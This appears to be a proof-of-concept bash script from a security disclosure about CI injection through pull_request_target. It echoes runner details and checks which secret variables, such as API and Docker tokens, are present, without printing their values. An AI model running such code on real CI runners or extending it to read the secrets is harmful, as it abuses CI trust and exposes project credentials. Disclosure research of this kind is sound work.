#!/bin/bash
# Copyright (C) 2024 Intel Corporation
# SPDX-License-Identifier: Apache-2.0

# SECURITY RESEARCH - CI INJECTION POC
# Demonstrates that pull_request_target + unsafe checkout allows
# fork code to execute on Intel CI runners with access to secrets.
# No secret values are read or exfiltrated - only presence is checked.

echo "=== CI INJECTION POC ==="
echo "Runner hostname : $(hostname)"
echo "Runner user     : $(whoami)"
echo "Working dir     : $(pwd)"
echo "GitHub actor    : ${GITHUB_ACTOR}"
echo "GitHub repo     : ${GITHUB_REPOSITORY}"
echo ""
echo "=== SECRET PRESENCE (names only, no values exfiltrated) ==="
for var in HF_TOKEN HUGGINGFACEHUB_API_TOKEN OPENAI_API_KEY DOCKERHUB_USER DOCKERHUB_TOKEN GOOGLE_API_KEY PINECONE_KEY GITHUB_TOKEN; do
    if [ -n "${!var}" ]; then
        echo "  $var : PRESENT"
    else
        echo "  $var : not set"
    fi
done
echo ""
echo "=== END POC — report submitted to Intel security team ==="
exit 0
